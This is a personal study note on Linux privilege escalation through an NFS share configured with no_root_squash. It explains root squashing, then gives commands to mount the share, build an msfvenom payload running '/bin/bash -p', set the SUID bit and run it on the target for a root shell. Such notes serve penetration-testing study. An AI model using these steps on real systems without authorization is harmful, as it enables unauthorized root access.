
2024-06-16 13:06

Source: #privesc 

Tags: [[linux]]

##### Root Squashing

- Root Squashing is how NFS prevents an obvious privilege escalation. 
- If the remote user is (or claims to be) root (uid=0), NFS will instead “squash” the user and treat them as if they are the “nobody” user, in the “nogroup” group. 
- While this behavior is default, it can be disabled
##### no_root_squash

- no_root_squash is an NFS configuration option which turns root squashing off.
- When included in a writable share configuration, a remote user who identifies as “root” can create files on the NFS share as the local root user.

##### Example : 

**Adversary machine**

- view contents of `/etc/exports`
- find for shares that are configured with the no_root_squash option (in the example we have /tmp) meaning we can write files to it as the root user over NFS

**Local Machine**

check if tmp share is available to mount 
```
$ showmount -e <targetip>
Export list for <targetip>
/tmp *
```
Create a directory that will be used as a mount point for the NFS share
```
mkdir /tmp/nfs

then mount the nfs share 
mount -o rw,vers=2 <targetip>:/tmp /tmp/nfs
```
Generate a [[msfvenom]] executable which runs bash with -p option and save this to the nfs share 
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```
Note that i am doing this as root user so the file should also be owned by root on the nfs share 
```
make it executable - 
chmod +xs /tmp/nfs/shell.elf
```
##### Adversary machine

check `/tmp` directory for shell.elf and execute it




### References
